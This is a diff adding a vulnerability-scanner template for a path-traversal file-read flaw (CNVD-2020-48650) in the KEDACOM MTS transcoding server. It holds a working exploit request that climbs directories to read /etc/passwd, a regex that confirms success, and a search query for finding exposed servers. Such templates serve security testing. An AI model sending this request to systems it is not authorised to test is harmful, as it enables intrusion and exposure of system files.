@@ -1,0 +1,17 @@
+name: KEDACOM MTS transcoding server Fileread CNVD-2020-48650
+manual: true
+query: title="MTS转码服务器"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /download/../../../../../../../../etc/passwd
+      follow_redirects: true
+    expression: response.status == 200 && "root:[x*]?:0:0:".bmatches(response.body)
+expression: r0()
+detail:
+  links:
+  - https://www.cnvd.org.cn/flaw/show/CNVD-2020-48650
+  description: KEDACOM MTS transcoding server
+  tags: fileread
